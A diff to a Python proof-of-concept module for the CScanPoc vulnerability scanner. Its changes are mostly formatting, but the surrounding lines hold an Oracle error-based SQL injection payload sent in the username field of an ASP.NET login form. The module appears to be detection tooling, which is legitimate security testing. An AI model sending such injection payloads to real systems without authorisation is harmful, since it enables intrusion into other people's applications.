@@ -3,7 +3,9 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
-import urllib.request, urllib.parse, urllib.error
+import urllib.request
+import urllib.parse
+import urllib.error
 
 
 class Vuln(ABVuln):
@@ -41,9 +43,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -71,7 +74,7 @@ Content-Type: application/x-www-form-urlencoded
 __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(116)||CHR(101)||CHR(115)||CHR(116)||CHR(118)||CHR(117)||CHR(108))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit=
     '''
     #payload = '''__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(98)||CHR(117)||CHR(103)||CHR(115)||CHR(99)||CHR(97) ||CHR(110))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit='''
-    #print '-d "'+payload+'" '+preWork
+    # print '-d "'+payload+'" '+preWork
                 code, head, res, errcode, _ = hh.http(preWork, raw=raw)
                 if code == 200 and "testvul" in res:
                     # security_hole(preWork)
